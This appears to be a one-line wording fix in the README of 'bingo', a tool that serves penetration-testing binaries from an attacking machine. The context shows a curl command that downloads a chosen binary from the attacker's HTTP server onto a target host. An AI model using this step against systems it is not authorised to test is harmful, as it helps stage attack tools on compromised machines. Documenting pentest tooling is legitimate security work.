@@ -30,7 +30,7 @@ bingo facilitates the distribution and execution of essential tools for penetrat
     curl http://{your-internal-IP}:8000/get/{binary-name} -o {path-to-output-file}
     ```
 
-- Replace {your-internal-IP} with the actal internal IP of the attacking machine.
+- Replace {your-internal-IP} with the attacker's machine IP.
 
 - Replace {binary-name} with the name of the binary you want to get, check `bingo.yaml` for available binaries.
 
